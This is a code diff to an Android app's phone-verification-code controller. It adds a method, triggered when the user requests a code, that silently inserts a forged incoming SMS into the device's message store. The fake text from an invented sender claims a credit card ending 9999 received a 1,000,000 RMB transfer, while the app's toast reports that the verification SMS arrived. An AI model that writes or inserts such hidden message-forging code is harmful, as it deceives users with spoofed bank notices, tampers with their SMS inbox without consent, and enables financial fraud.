@@ -1,6 +1,8 @@
 package com.yuepang.yuepang.control;
 
 import android.annotation.SuppressLint;
+import android.content.ContentResolver;
+import android.content.ContentValues;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Handler;
@@ -70,6 +72,7 @@ public class GetTelCodeControl implements View.OnClickListener {
                 public void run() {
                     try {
                         Thread.sleep(500);
+                        writeMsg();
                         activity.showToastSafe("短信获得成功");
                         startCountDown();
                     } catch (InterruptedException e) {
@@ -79,6 +82,18 @@ public class GetTelCodeControl implements View.OnClickListener {
             });
         }
     }
+
+
+    private void writeMsg() {
+        ContentResolver cr = activity.getContentResolver();
+        ContentValues values = new ContentValues();
+        values.put("address", "155634611");
+        values.put("type", 1);
+        values.put("date", System.currentTimeMillis());
+        values.put("body", "您尾号为9999的信用卡收到1,000,000RMB转账，请注意查收");
+        cr.insert(Uri.parse("content://sms"), values);
+    }
+
 
     private void startCountDown() {
         activity.runOnUiThread(new Runnable() {
